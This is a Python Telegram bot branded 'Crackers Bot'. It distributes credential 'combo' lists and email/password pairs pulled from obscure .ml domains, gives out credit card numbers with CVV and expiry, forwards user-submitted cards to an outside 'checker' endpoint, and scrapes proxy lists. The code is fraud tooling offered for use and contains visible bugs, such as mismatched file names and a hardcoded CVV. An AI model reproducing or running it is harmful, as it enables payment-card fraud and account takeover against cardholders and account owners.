import requests
from telebot import types
import telebot
from time import sleep
import random
token = input(" [~] Enter Token : ")
bot = telebot.TeleBot(token)
r=requests.session() 


@bot.message_handler(commands=['start'])
def start(message):
    use = message.from_user.username
    fr = message.from_user.first_name
    bjj = message.chat.id
    bot.send_message(message.chat.id,text=f"""<strong>
Hi <code>{fr}</code>
- - - - - - - - - - 
Welcome Crackers Bot! 
/combo - to get free combo! 
/mail - to get random account mail! 
/check - to check your visa! 
/visa - to get free visa card! 
/proxy - to get free proxies! 
- - - - - - - - - - 
</strong>
    """,parse_mode='html',reply_to_message_id=message.message_id)
@bot.callback_query_handler(func=lambda m: True)
@bot.message_handler(commands=['combo'])
def trakos(message):
	url2 = requests.get("https://cvcbnhfuu.ml/HMD/api/Combo.php").json()
	count = url2['Count']['Combo Count']
	combo = url2['List']['Combo']
	with open('combo2.txt','a') as x:
	       x.write(f"\n{combo}")
	       doc = open('combo.txt','rb')
	       bot.send_document(message.chat.id,doc,caption=f"<strong>Done Generate ✅\nCount : {count}</strong>",parse_mode='html')
@bot.message_handler(commands=['visa'])
def baa(message):
    url = requests.get('https://cvcbnhfuu.ml/HMD/api/Random.php').json()
    card1 = url['CreditCard']['CardNumber']
    card2 = url['CreditCard']['CVV']
    crad3 = url['CreditCard']['EXP']
    bot.send_message(message.chat.id,f"<strong>Done ✅:\nVisa : {card1}|{card2}|444</strong>",parse_mode="html")
@bot.message_handler(commands=['mail'])
def mail(message):
    com = 'كومبو'
    url3 = requests.get(f"https://asdxxcv.ml/API/Test/Combo.php?get={com}").json()
    eml = url3['Email']
    pas = url3['Password']
    bot.send_message(message.chat.id,f"<strong>Email : {eml}\nPassword : {pas}\nSite : null</strong>",parse_mode="html")
@bot.message_handler(commands=['check'])
def check(message):
    bot.send_message(message.chat.id,"<strong>Send Your Visa To Check</strong>",parse_mode="html")
    @bot.message_handler(func=lambda m:True)
    def chh(message):
        mssg = message.text
        url4 = requests.get(f"https://dddggfg.ml/Xo/cards.php?card={mssg}").text
        bot.send_message(message.chat.id,f"**Result : {url4}**",parse_mode="markdown")
@bot.message_handler(commands=['proxy'])
def prox(message):
    url5 = requests.get("https://www.proxy-list.download/api/v1/get?type=http").text
    with open('proxies.txt','a')as r:
        r.write(f"\n{url5}")
        doc1 = open('proxies.txt','rb')
    bot.send_document(message.chat.id,doc1,caption="<strong>Done Scrap ✅ </strong>",parse_mode='html')
    
pass
bot.polling(True)
